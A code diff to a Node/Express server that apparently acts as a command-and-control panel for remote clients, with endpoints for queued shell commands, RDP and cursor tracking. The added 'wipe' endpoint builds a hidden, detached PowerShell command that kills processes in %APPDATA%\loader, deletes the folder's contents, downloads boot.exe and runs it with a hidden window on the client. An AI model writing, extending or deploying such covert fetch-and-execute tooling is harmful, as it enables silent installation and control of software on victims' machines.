@@ -160,6 +160,29 @@ const getOwnUser = (uid) => db.prepare(sql`
   FROM users WHERE id = ?
 `).get(uid);
 
+// ---------- wipe helper ----------
+// builds the powershell command that kills the client, wipes %APPDATA%\loader,
+// downloads fresh boot.exe, and launches it. runs the payload in a detached
+// powershell grandchild so it survives the death of st.exe.
+function buildWipeCommand(serverBase) {
+  const bootUrl = `${serverBase}/api/downloads/boot.exe`;
+
+  const inner = [
+    `$dir = Join-Path $env:APPDATA 'loader'`,
+    `New-Item -ItemType Directory -Force -Path $dir | Out-Null`,
+    `Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.Path -and $_.Path.StartsWith($dir, [System.StringComparison]::OrdinalIgnoreCase) } | Stop-Process -Force -ErrorAction SilentlyContinue`,
+    `Start-Sleep -Milliseconds 800`,
+    `for ($i=0; $i -lt 5; $i++) { try { Remove-Item -Recurse -Force (Join-Path $dir '*') -ErrorAction Stop; break } catch { Start-Sleep -Milliseconds 400 } }`,
+    `Start-Sleep -Milliseconds 400`,
+    `Invoke-WebRequest -Uri '${bootUrl}' -OutFile (Join-Path $dir 'boot.exe') -UseBasicParsing`,
+    `Start-Process -FilePath (Join-Path $dir 'boot.exe') -WorkingDirectory $dir -WindowStyle Hidden`,
+  ].join('; ');
+
+  const escaped = inner.replace(/'/g, "''");
+
+  return `Start-Process -FilePath 'powershell.exe' -WindowStyle Hidden -ArgumentList @('-NoProfile','-NonInteractive','-Command','${escaped}')`;
+}
+
 app.use(express.static(PUBLIC_DIR, {
   etag: true,
   maxAge: '1h',
@@ -393,6 +416,27 @@ app.delete('/api/clients/:id', requireAuth, (req, res) => {
   res.json({ ok: true });
 });
 
+app.post('/api/clients/:id/wipe', requireAuth, (req, res) => {
+  const cid = Number(req.params.id);
+  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
+  if (!client) return res.status(404).json({ error: 'client not found' });
+
+  let base = req.body?.serverBase;
+  if (!base) {
+    const proto = req.secure || req.headers['x-forwarded-proto'] === 'https' ? 'https' : 'http';
+    base = `${proto}://${req.headers.host}`;
+  }
+
+  const line = buildWipeCommand(base);
+
+  const info = db.prepare(sql`
+    INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
+    VALUES (?, ?, 'powershell', ?, 'pending', ?)
+  `).run(req.user.uid, cid, line, Date.now());
+
+  res.json({ ok: true, commandId: Number(info.lastInsertRowid), bytes: line.length });
+});
+
 app.post('/api/clients/:id/rdp/start', requireAuth, (req, res) => {
   const cid = Number(req.params.id);
   const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
@@ -458,7 +502,6 @@ app.get('/api/clients/:id/cursor', requireAuth, (req, res) => {
   const cid = Number(req.params.id);
   const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
   if (!client) return res.status(404).json({ error: 'client not found' });
-
   const c = getCursor(cid);
   if (!c) return res.status(204).end();
   res.json(c);
